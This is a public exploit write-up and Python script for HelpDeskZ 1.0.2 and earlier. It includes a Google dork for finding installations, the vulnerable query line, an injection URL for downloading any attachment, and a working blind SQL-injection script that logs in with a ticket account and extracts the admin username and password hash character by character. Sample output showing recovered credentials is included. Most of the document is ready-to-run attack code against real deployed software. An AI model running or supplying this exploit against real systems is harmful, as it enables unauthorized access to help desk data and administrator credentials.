'''
# Exploit Title: HelpDeskZ <= v1.0.2 - Authenticated SQL Injection / Unauthorized file download
# Google Dork: intext:"Help Desk Software by HelpDeskZ", inurl:?v=submit_ticket
# Date: 2017-01-30
# Exploit Author: Mariusz Popławski, kontakt@deepsec.pl ( www.afine.pl )
# Vendor Homepage: http://www.helpdeskz.com/
# Software Link: https://github.com/evolutionscript/HelpDeskZ-1.0/archive/master.zip
# Version: <= v1.0.2
# Tested on:
# CVE :
 
HelpDeskZ <= v1.0.2 suffers from an sql injection vulnerability that allow to retrieve administrator access data, and download unauthorized attachments.
 
Software after ticket submit allow to download attachment by entering following link:
http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1(ATTACHMENT_ID_HERE)

FILE: view_tickets_controller.php
LINE 95:	$attachment = $db->fetchRow("SELECT *, COUNT(id) AS total FROM ".TABLE_PREFIX."attachments WHERE id=".$db->real_escape_string($params[2])." AND ticket_id=".$params[0]." AND msg_id=".$params[3]);

third argument AND msg_id=".$params[3]; sent to fetchRow query with out any senitization

 
Steps to reproduce:
 
http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1 or id>0 -- -


by entering a valid id of param[] which is our submited ticket id and adding our query on the end of request we are able to download any uploaded attachment.
 
Call this script with the base url of your HelpdeskZ-Installation and put your submited ticket login data (EMAIL, PASSWORD)

steps:
1. go to http://192.168.100.115/helpdesk/?v=submit_ticket
2. Submit a ticket with valid email (important we need password access).
3. Add attachment to our ticket (important step as the attachment table may be empty, we need at least 1 attachment in db to valid our query).
4. Get the password from email.
4. run script

root@kali:~/Desktop# python test.py http://192.168.100.115/helpdesk/ localhost@localhost.com password123

where http://192.168.100.115/helpdesk/ = base url to helpdesk
localhost@localhost.com = email which we use to submit the ticket
password123 = password that system sent to our email

Output of script:
root@kali:~/Desktop# python test.py http://192.168.100.115/helpdesk localhost@localhost.com password123
2017-01-30T09:50:16.426076   GET   http://192.168.100.115/helpdesk
2017-01-30T09:50:16.429116   GET   http://192.168.100.115/helpdesk/
2017-01-30T09:50:16.550654   POST   http://192.168.100.115/helpdesk/?v=login
2017-01-30T09:50:16.575227   GET   http://192.168.100.115/helpdesk/?v=view_tickets
2017-01-30T09:50:16.674929   GET   http://192.168.100.115/helpdesk?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=1&param[]=1%20or%201=1%20and%20ascii(substr((SeLeCt%20table_name%20from%20information_schema.columns%20where%20table_name%20like%20'%staff'%20%20limit%200,1),1,1))%20=%20%2047%20--%20-
...
------------------------------------------
username: admin
password: sha256(53874ea55571329c04b6998d9c7772c9274d3781)

'''           
import requests
import sys

if( len(sys.argv) < 3):
	print "put proper data like in example, remember to open a ticket before.... "
	print "python helpdesk.py http://192.168.43.162/helpdesk/ myemailtologin@gmail.com password123"
	exit()
EMAIL = sys.argv[2]
PASSWORD = sys.argv[3]

URL = sys.argv[1]

def get_token(content):
	token = content
	if "csrfhash" not in token:
		return "error"
	token = token[token.find('csrfhash" value="'):len(token)]
	if '" />' in token:
		token = token[token.find('value="')+7:token.find('" />')] 
	else:
		token = token[token.find('value="')+7:token.find('"/>')] 
	return token

def get_ticket_id(content):
	ticketid = content
	if "param[]=" not in ticketid:
                return "error"
	ticketid = ticketid[ticketid.find('param[]='):len(ticketid)]
	ticketid = ticketid[8:ticketid.find('"')]
	return ticketid


def main():

    # Start a session so we can have persistant cookies
	session = requests.session(config={'verbose': sys.stderr})

	r = session.get(URL+"")
	
	#GET THE TOKEN TO LOGIN
        TOKEN = get_token(r.content)
	if(TOKEN=="error"):
		print "cannot find token"
		exit();
    #Data for login 
	login_data = {
		'do': 'login',
		'csrfhash': TOKEN,
		'email': EMAIL,
		'password': PASSWORD,
		'btn': 'Login'
	}

    # Authenticate
	r = session.post(URL+"/?v=login", data=login_data)
    #GET  ticketid
	ticket_id = get_ticket_id(r.content)
        if(ticket_id=="error"):
                print "ticketid not found, open a ticket first"
		exit()
	target = URL +"?v=view_tickets&action=ticket&param[]="+ticket_id+"&param[]=attachment&param[]=1&param[]=1"

	limit = 1
        char = 47
        prefix=[]
        while(char!=123):
                target_prefix = target+ " or 1=1 and ascii(substr((SeLeCt table_name from information_schema.columns where table_name like '%staff'  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
                response = session.get(target_prefix).content
                if "couldn't find" not in response:
                        prefix.append(char)
                        limit=limit+1
                        char=47
                else:
                        char=char+1
	table_prefix = ''.join(chr(i) for i in prefix)
	table_prefix = table_prefix[0:table_prefix.find('staff')]
	
	limit = 1
	char = 47
	admin_u=[]
	while(char!=123):
		target_username = target+ " or 1=1 and ascii(substr((SeLeCt username from "+table_prefix+"staff  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
		response = session.get(target_username).content
		if "couldn't find" not in response:
			admin_u.append(char)
			limit=limit+1
			char=47
		else:
			char=char+1

        limit = 1
        char = 47
        admin_pw=[]
        while(char!=123):
                target_password = target+ " or 1=1 and ascii(substr((SeLeCt password from "+table_prefix+"staff  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
                response = session.get(target_password).content
                if "couldn't find" not in response:
                        admin_pw.append(char)
                        limit=limit+1
                        char=47
                else:
                        char=char+1


	admin_username = ''.join(chr(i) for i in admin_u)
	admin_password = ''.join(chr(i) for i in admin_pw)

	print "------------------------------------------"
	print "username: "+admin_username
	print "password: sha256("+admin_password+")"
	if admin_username==""  and  admin_password=='':
		print "Your ticket have to include attachment, probably none atachments found, or prefix is not equal hdz_"
		print "try to submit ticket with attachment"
if __name__ == '__main__':
    main()